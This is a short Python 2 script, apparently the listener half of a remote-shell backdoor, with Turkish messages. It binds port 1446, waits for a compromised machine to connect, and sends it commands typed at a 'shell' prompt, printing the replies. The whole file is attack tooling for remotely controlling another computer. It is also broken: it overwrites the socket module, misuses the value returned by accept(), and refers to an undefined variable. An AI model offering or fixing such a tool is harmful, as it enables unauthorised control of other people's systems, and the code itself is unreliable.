import socket
import sys
import time


try:
	socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	host = sys.argv[1]
	port = 1446
	socket.bind((host, port))
	socket.listen(5)
	misafir = socket.accept()
	try:
		misafir.send("ay isiginda uluyan kurt baglandi..!")
	except:
		socket.close()
		exit()
	while True:
	        cod = raw_input("< s h e l l >")
	        if cod == "Q":
	                misafir.send("Q")
	                misafir.close()
	                break
	        else:
	                misafir.send(cod)
			print "okunuyor...."
	                try:
				ret = misafir.recv(1024)
				if not ret:
					pass
				else:
			                print b + ret
			except:
				print "bostu galiba..."
except:
	print "cikildi..."
	socket.close()
